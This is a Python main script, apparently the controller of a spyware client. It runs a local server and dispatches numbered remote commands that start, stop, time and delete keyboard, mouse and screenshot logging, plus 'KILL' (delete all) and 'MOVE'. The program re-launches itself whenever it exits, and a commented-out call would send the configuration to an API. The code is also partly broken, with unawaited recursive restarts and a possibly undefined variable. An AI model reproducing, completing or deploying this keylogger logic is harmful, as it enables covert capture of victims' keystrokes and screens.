from app._init_client import Env as env
from app._config import Config as client_config
from app._client import Client as client
from app._server import Server as server
from app.functions import send_api, redirect_output,check_env, load_env, check_log, run_server_sub
from app.tasks_functions import *
import asyncio, threading, multiprocessing, queue, subprocess, json, queue, sys #close terminal 
import json
from app.excpetion import ResetConfigException, kill
threads_done = threading.Event()
URL = "http://localhost:8000/api/"
PATH_JSON = "./.log/config.json"
PATH_LOG = "./.log/"
async def main(force=False):
    """main function"""  
    
    try:
        # if threads_done.is_set(): return # If the thread is already running, do nothing
        # elif not threads_done.is_set(): threads_done.set() # Set the thread as running
    
            #check if log file exist
        if not await check_log(): return await main() #if error, restart the main function
        
        #if .env file is not valid, we create it

        if force or not await check_env()  == True:
            # creating a suitable configuration
            generate_env = env()
            if not await generate_env.ainit(): raise Exception("Error while init .env file")
            
            #applying the configuration & save it on .env file
            generate_config = client_config()
            generated_config = await generate_config.ainit()
            if not generated_config: raise Exception("Error while init config")
        else: 
            generate_config = await load_env()
        
        # Queue for the server subprocess
        server_output_queue = queue.Queue()
        
        # Starting the server with the configuration
        start_server = server()
        if not await start_server.ainit(generate_config): return main() #if error, restart the main function
        
        # Run the server subprocess
        server_process = run_server_sub()
        
        # Create a thread to read output
        server_output_thread = threading.Thread(target=redirect_output, args=(server_process.stdout, server_output_queue))

        ## /!\ Start subprocess server /!\ ###
        try:
            server_output_thread.start()
        except: return main() #if error, restart the main function
        ## /!\ Start subprocess server /!\ ###
        
        #when all is good, we can send data to api ---------------------------------DONT LOST THAT NAGIB :D -----------------------------
        # await send_api(URL, generated_config)
        
        #starting the client with the configuration
        generate_client = client()
        if not await generate_client.ainit(generate_config): return main() #if error, restart the main function
        
        
        while True:
            if subprocess.Popen.poll(server_process) != None:# Forced restart if the server is closed by ? entity
                server_process = PAUSE_SERVER(1,server_process)
                server_output_queue = queue.Queue()
                server_output_thread = threading.Thread(target=redirect_output, args=(server_process.stdout, server_output_queue))
                server_output_thread.start()
                
                
            elif subprocess.Popen.poll(server_process) == None:# If is enabled
                if not server_output_queue.empty(): # Check if the server has sent any output
                    line = server_output_queue.get()
                    if not line:# If the server has closed reset the queue and thread
                        server_output_queue = queue.Queue()
                        server_output_thread = threading.Thread(target=redirect_output, args=(server_process.stdout, server_output_queue))
                        server_output_thread.start()
                    else:
                        
                        # Error gestion
                        if line != None:
                            data = str(line).replace("'", "\"")
                            data_json = json.loads(data)
                            if data_json['error'] == 404:line = None # If data is not recognized by the server, reset the queue and thread
                            else: 
                                commande = int(data_json["index_task"])
                                
                                if commande == 0: 
                                    server_process = PAUSE_SERVER(int(data_json["x_break"]),server_process)
                                
                    
                                elif commande == 1:await STOP_SERVER(server_process)#
                                elif commande == 2:await STOP_CAPTURE_KEYBOARD()
                                elif commande == 3:await STOP_CAPTURE_MOUSE()
                                elif commande == 4:await STOP_CAPTURE_PICTURE()
                                elif commande == 5:#check if need await or asyncio
                                    RESTART_SERVER()
                                    await main()
                                elif commande == 6:#
                                    if not await STOP_LOG_KEYBOARD(PATH_JSON):
                                        #Send from client to API > Send to Socket server
                                        pass
                                elif commande == 7:#
                                    if not await STOP_LOG_MOUSE(PATH_JSON):
                                        #Send from client to API > Send to Socket server
                                        pass
                                elif commande == 8:#
                                    if not await STOP_LOG_PICTURE(PATH_JSON):
                                        #Send from client to API > Send to Socket server
                                        pass
                                elif commande == 9:#
                                    if not await START_LOG_KEYBOARD(PATH_JSON):
                                        #Send from client to API > Send to Socket server
                                        pass
                                elif commande == 10:#
                                    if not await START_LOG_MOUSE(PATH_JSON):
                                        #Send from client to API > Send to Socket server
                                        pass
                                elif commande == 11:#
                                    if not await START_LOG_PICTURE(PATH_JSON):
                                        #Send from client to API > Send to Socket server
                                        pass
                                elif commande == 12:#a modifier
                                    data = await STATUS_SERVER(PATH_JSON)
                                    print(data)
                                elif commande == 13:#
                                    data = await STATUS_LOG(PATH_JSON)
                                    print(data)
                                elif commande == 14:raise ResetConfigException#
                                elif commande == 15:KILL()#raise kill #delete all
                                elif commande == 16:
                                   
                                    if not data_json["timer"]:line = None
                                    elif not data_json["type"]:line = None
                                    
                                    
                                    timer_selected = int(data_json["timer"])
                                    type_selected = data_json["type"]
                                    
                                    if type_selected == "KEYBOARD":
                                        result = await LOG_TIMER(type="KEYBOARD",timer=timer_selected,path=PATH_JSON)
                                        print(result)
                                    elif  type_selected == "MOUSE":
                                        result =  await LOG_TIMER(type="MOUSE",timer=timer_selected,path=PATH_JSON)
                                        print(result)
                                    elif  type_selected == "PICTURE":
                                        result = await LOG_TIMER(type="PICTURE",timer=timer_selected,path=PATH_JSON)
                                        print(result)
                                    elif  type_selected == "ALL":
                                        result = await LOG_TIMER(type="ALL",timer=timer_selected,path=PATH_JSON)
                                        print(result)
                                        
                                elif commande == 17:
                                    type_selected = data_json["type"]
                                    if type_selected == "KEYBOARD":
                                        if not await DELETE_LOG(type="KEYBOARD",path=PATH_LOG):print("keyboard folder already deleted")
                                        else: print("keyboard deleted")
                                    elif  type_selected == "MOUSE":
                                        if not await DELETE_LOG(type="MOUSE",path=PATH_LOG):print("mouse folder already deleted")
                                        else: print("mouse deleted")
                                    elif  type_selected == "PICTURE":
                                        if not await DELETE_LOG(type="PICTURE",path=PATH_LOG):print("picture folder already deleted")
                                        else: print("picture deleted")
                                    elif  type_selected == "ALL":
                                        if not await DELETE_LOG(type="ALL",path=PATH_LOG):print("all folders already deleted")
                                        else:print("all deleted")
                                elif commande == 18:MOVE()#voir comment faire
                                else: print("Not implemented")
              
    except kill:pass                       
    except ResetConfigException:
        RESET_CONFIG(server_process=server_process)
        return await main(force=True)
    except Exception as err: print(err)
   
    finally: 
        RESET_CONFIG(server_process=server_process)
        print("[x] - Server close") # Signal the end of the thread
        return await main(force=True)
        
if __name__ == "__main__":
    multiprocessing.set_start_method('spawn')
    asyncio.run(main())
    threads_done.clear()
    sys.exit() #close terminal if exist
    